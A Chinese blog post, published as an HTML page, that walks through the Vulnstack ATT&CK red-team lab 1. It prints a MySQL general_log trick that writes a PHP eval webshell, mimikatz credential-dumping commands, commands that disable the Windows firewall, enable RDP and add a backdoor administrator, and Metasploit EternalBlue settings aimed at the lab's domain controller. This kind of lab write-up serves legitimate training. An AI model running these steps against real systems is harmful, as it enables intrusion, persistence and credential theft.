@@ -1,0 +1,419 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>ATT&amp;CK红队评估实战靶场-1 | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="下载地址：漏洞详情 (qiyuanxuetang.net)
+
+环境搭建网络拓扑：
+初始的密码都是 hongrisec@2019，部分可能要重置密码
+域环境的网段是写死的 192.168.52.0&amp;#x2F;24
+在C盘找到 phpstudy 启动服务
+外网打点phpmyadmin写马访问站点是一个 phpstudy 探针
+扫下端口，注意开了 3306 端口有防火墙"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="ATT&amp;CK红队评估实战靶场-1"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> ATT&amp;CK红队评估实战靶场-1</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情 (qiyuanxuetang.net)</a></p>
+</blockquote>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>网络拓扑：<br><img src="/Rxi134_FILE/d7dd99fe113508cbf08ada16b18c69ca_MD5.jpeg"></p>
+<p>初始的密码都是 <code>hongrisec@2019</code>，部分可能要重置密码</p>
+<p>域环境的网段是写死的 192.168.52.0&#x2F;24</p>
+<p>在C盘找到 phpstudy 启动服务<br><img src="/Rxi134_FILE/66b08c3cd34492516801ae06253b9624_MD5.jpeg"></p>
+<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="phpmyadmin写马"><a href="#phpmyadmin写马" class="headerlink" title="phpmyadmin写马"></a>phpmyadmin写马</h2><p>访问站点是一个 phpstudy 探针<br><img src="/Rxi134_FILE/6a6179b7a8c5d2368b842b6ea8ae7a36_MD5.jpeg"></p>
+<p>扫下端口，注意开了 3306 端口<br><img src="/Rxi134_FILE/605b2a9714c8e53b1cdc7c48b6fb558d_MD5.jpeg"><br>有防火墙</p>
+<p>dirsearch 速扫<br><img src="/Rxi134_FILE/2838396d0573f8459b81f3b52a7399b5_MD5.jpeg"></p>
+<p>&#x2F;readme 查看到版本为 3.5.8.2<br><img src="/Rxi134_FILE/649c61ddd29d4580811dfdcc03f4972f_MD5.jpeg"></p>
+<p>root:root直接进后台了<br><img src="/Rxi134_FILE/3a56f2a12461d4fad5ecfe87ef16074f_MD5.jpeg"></p>
+<p>第一步肯定是写马，通过phpinfo页面泄露了网站绝对路径 	C:&#x2F;phpStudy&#x2F;WWW<br><img src="/Rxi134_FILE/78453fa6fde1da6dbad9fbc2caeabc09_MD5.jpeg"></p>
+<p><code>show global variables like &quot;secure%&quot;</code>  无权直接写<br><img src="/Rxi134_FILE/8b5f038fc0e8113cf2f25a5e102a53a6_MD5.jpeg"></p>
+<p><code>show variables like &#39;%general%&#39;;</code>  查看日志状态<br><img src="/Rxi134_FILE/e062de56aa4d26682f87334d618d01f3_MD5.jpeg"></p>
+<p>打开日志写马</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">"on"</span><span class="token punctuation">;</span>
+<span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">"C:\\phpStudy\\WWW\\fuck.php"</span><span class="token punctuation">;</span>
+<span class="token keyword">select</span> <span class="token string">"&lt;?php eval($_POST[pwd]); ?>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>蚁剑连上去<br><img src="/Rxi134_FILE/22dcfc7cf6830bfcd2f039159866ae1e_MD5.jpeg"></p>
+<h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><p>拿到了shell，不过发现有一个 yxcms 目录（数据库里也有 newycms ）<br><img src="/Rxi134_FILE/5851e7a33c9394a25dc4c433b7c37f4d_MD5.jpeg"></p>
+<p><img src="/Rxi134_FILE/075fe84d667cd331805108e924180898_MD5.jpeg"></p>
+<p>直接进入后台<br><img src="/Rxi134_FILE/60ad05e0511dbd0dcd4373500a1793b0_MD5.jpeg"><br>这边在前台发现可以更改网站模板<br><img src="/Rxi134_FILE/542275ea3a4be53c9a4eaeaf2b637cc0_MD5.jpeg"></p>
+<p>在网上查阅资料，模板文件位于 <code>/protected/apps/admin/view/</code> 下<br><img src="/Rxi134_FILE/cdd86ad2510038db60db1008bbdaf1a0_MD5.jpeg"></p>
+<p>写入webshell即可</p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>这边发现web服务器处在 GOD 域<br><img src="/Rxi134_FILE/62bde2c055f864a41df2359c7d2fc81b_MD5.jpeg"></p>
+<p>使用 frp 作为反向代理，反弹shell到msf<br><img src="/Rxi134_FILE/a9893884ef8ead61d86368998319d2ad_MD5.jpeg"><br><img src="/Rxi134_FILE/44f4483735f8b10879da4eab5d036ba8_MD5.jpeg"></p>
+<p>ipconfig &#x2F;all 发现了其它网段：192.168.52.0&#x2F;24</p>
+<p>给 msf 添加一段 session 路由：<br><img src="/Rxi134_FILE/5dc634869627198f50e88c8072ad3f26_MD5.jpeg"></p>
+<p>利用proxychains 实现内网代理<br><img src="/Rxi134_FILE/d08d392b01088f46c2e8d78e40ad90c4_MD5.jpeg"></p>
+<h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>win7机器。主机名为 STU1<br><img src="/Rxi134_FILE/4888e3a5a05fa13d29462b3eb307baa9_MD5.jpeg"><br><img src="/Rxi134_FILE/2423b262365f3d131f5747fd526d113f_MD5.jpeg"></p>
+<p>管理员权限，直接迁移进程到 lsass.exe<br><img src="/Rxi134_FILE/48c6914e05b0a6d30470d24219dc58dc_MD5.jpeg"></p>
+<p>mimikatz 抓取明文密码：<code>god\Administrator:hongrisec@2019</code><br><img src="/Rxi134_FILE/ac5dbe258bda12ef7271887dd5ec77de_MD5.jpeg"></p>
+<p>windows防火墙处于开启状态，直接关闭</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netsh advfirewall <span class="token function">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>开启远程桌面</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/a0ad78682d9f162654779ff0317b14aa_MD5.jpeg"></p>
+<p><code>net view /domain</code>查看有几个域，只有GOD一个域<br><img src="/Rxi134_FILE/0f29f7520a5a593a4b331285e14e9af9_MD5.jpeg"></p>
+<p><code>net view /domain:GOD</code>查看GOD域内所有主机<br><img src="/Red_FILE/7d6c6afce54bef7142e2bcb011f4dfda_MD5.jpeg"></p>
+<p><code>net group /domain</code> 查看域用户组<br><img src="/Rxi134_FILE/f23f2d20a63f6b909801c35a6d5e5317_MD5.jpeg"></p>
+<p><code>net group &quot;Domain Controllers&quot; /domain</code> 确定DC<br><img src="/Rxi134_FILE/944a26e6658ee835bff7b566f2e3ae1f_MD5.jpeg"></p>
+<p>既然在域内，利用 netbios协议 探测内网主机<br><img src="/Rxi134_FILE/25c5c05f8140aede807e09a51bd922ba_MD5.jpeg"><br>确定 141 的域PC ，和 138 的DC</p>
+<h2 id="永恒之蓝攻破DC、域PC"><a href="#永恒之蓝攻破DC、域PC" class="headerlink" title="永恒之蓝攻破DC、域PC"></a>永恒之蓝攻破DC、域PC</h2><p>通过msf搭建socks5隧道<br><img src="/Rxi134_FILE/7190ed049d8a421673767639b2135e54_MD5.jpeg"></p>
+<p>proxfier 检查<br><img src="/Rxi134_FILE/4a880d027642c2a0b6f1b0d6faa982f0_MD5.jpeg"></p>
+<p>然后设置浏览器代理<br><img src="/Rxi134_FILE/939fb88fca8c009f7fbb65f45fd6424e_MD5.jpeg"></p>
+<p>成功访问到内网里 DC 的80端口<br><img src="/Rxi134_FILE/4eb1cbb89f9311facea2a54ee1beecce_MD5.jpeg"></p>
+<p>端口扫描，利用  proxychains 将我们的流量带入内网</p>
+<p>138 DC端口开放情况：<br><img src="/Rxi134_FILE/f28880db586a6aa81d22407edf3c5fe8_MD5.jpeg"></p>
+<p>141 域PC端口开放情况：<br><img src="/Rxi134_FILE/194285cc6d827ef391a6b7dc176d4ef7_MD5.jpeg"></p>
+<p>很敏感想到永恒之蓝<br><img src="/Rxi134_FILE/56e0d75fedfb5066f1a0d1bae4133ed2_MD5.jpeg"></p>
+<p>先打DC</p>
+<pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">msf6 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
+msf6 &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp
+msf6 &gt; set rhosts 192.168.52.138
+msf6 &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>但是反弹shell失败了，网上查阅永恒之蓝直接反弹shell的几率还是不大的</p>
+<p>这边使用 admin&#x2F;smb&#x2F;ms17_010_command 来执行命令<br><img src="/Rxi134_FILE/8c31fb6cec07c86d799101be58d71c2e_MD5.jpeg"></p>
+<p>那就简单了，添加一个用户并加入管理员，同时开启远程桌面</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">set</span> command net user x1nri Zzx<span class="token punctuation">.</span>123 <span class="token operator">/</span>add
+net user x1nri <span class="token operator">/</span>active:yes
+net localgroup Administrators x1nri <span class="token operator">/</span>add
+
+reg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f
+netsh advfirewall firewall add rule name=<span class="token string">"允许RDP"</span> protocol=TCP <span class="token function">dir</span>=in localport=3389 action=allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>设置 proxifier 代理规则<br><img src="/Rxi134_FILE/00ceda9c0016f0832a563c6231c8db56_MD5.jpeg"></p>
+<p>远程桌面登录 <code>god\x1nri:Zzx.123</code>，拿到 DC 的 shell<br><img src="/Rxi134_FILE/23a2af87a7ffda74e88781eaed7fc00d_MD5.jpeg"></p>
+<p>上传mimikatz，以管理员运行抓取密码</p>
+<pre class="line-numbers language-mimikatz" data-language="mimikatz"><code class="language-mimikatz">mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/70fe24cc8636b188b0930577bcec469b_MD5.jpeg"><br>抓取到密码（环境搭建时改的密码）：<code>liukaifeng01:HONGRISEC@2019</code>，但是并没有抓取到administrator的密码</p>
+<p>选中快速编辑，方便复制黏贴<br><img src="/Rxi134_FILE/de5d490af01e9a90d3a0ad717bd8cfcd_MD5.jpeg"></p>
+<p>跳板机无法运行frp<br><img src="/Rxi134_FILE/c09bb9abe5947989b47e91dce7ede880_MD5.jpeg"></p>
+<p>关闭防火墙，正连拿到shell<br><img src="/Rxi134_FILE/c558ddc843f8c9a589e8be82428568da_MD5.jpeg"></p>
+<p>同理，利用永恒之蓝再拿到域 PC shell </p>
+<h1 id="利用CS"><a href="#利用CS" class="headerlink" title="利用CS"></a>利用CS</h1><p>这边利用CS再走一遍流程（对CS不太熟，加深下理解），这里使用的是二开的CAT CS</p>
+<p>设置一个beacon_http的监听器，监听80端口<br><img src="/Rxi134_FILE/e2621704b1231742b5ea146581e5d4a1_MD5.jpeg"></p>
+<p>上线webserver，直接拿到了administrator权限<br><img src="/Rxi134_FILE/07d69db871fd49c5e67a8d126118e452_MD5.jpeg"></p>
+<p>设置心跳时间（这里不是真实环境直接设为0了）<br><img src="/Rxi134_FILE/82e77dc5fb7aef4133d9651f2df74207_MD5.jpeg"></p>
+<p>通过自带模块 getsystem 提升权限到SYSTEM，再通过进程注入返回一个新的shell<br><img src="/Rxi134_FILE/25b63f034b9008bc32f18d9b32f215a5_MD5.jpeg"></p>
+<p>net view探测域内主机<br><img src="/Rxi134_FILE/33b1dc2afcbab5f2afb38ef6cf43a33f_MD5.jpeg"></p>
+<p>上一个fscan内网大保健<br><img src="/Rxi134_FILE/79f4a4425c10ad714d943c7f01d71fca_MD5.jpeg"></p>
+<p>我用的二开CS，不能直接派生会话给msf，只能重新上马了</p>
+<p>在 跳板机 上设置一个新的代理监听器<br><img src="/Rxi134_FILE/57a05d38484ff210802fc0ba4bb1dfc0_MD5.jpeg"></p>
+<p>之后就是正常ms17_010的利用，略</p>
+<p>总结：CS真方便哇</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/" class="leancloud-visitors view" data-flag-title="ATT&amp;CK红队评估实战靶场-1">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/10/05/ATT&CK红队评估实战靶场-3/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/09/18/长城杯京津冀2024初赛/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-09-27 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Vulnstack靶场/">Vulnstack靶场<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-article-text">环境搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-article-text">外网打点</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#phpmyadmin%E5%86%99%E9%A9%AC"><span class="toc-article-text">phpmyadmin写马</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#yxcms"><span class="toc-article-text">yxcms</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-article-text">内网渗透</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="toc-article-text">内网代理</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">内网信息搜集</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E7%A0%B4DC%E3%80%81%E5%9F%9FPC"><span class="toc-article-text">永恒之蓝攻破DC、域PC</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8CS"><span class="toc-article-text">利用CS</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
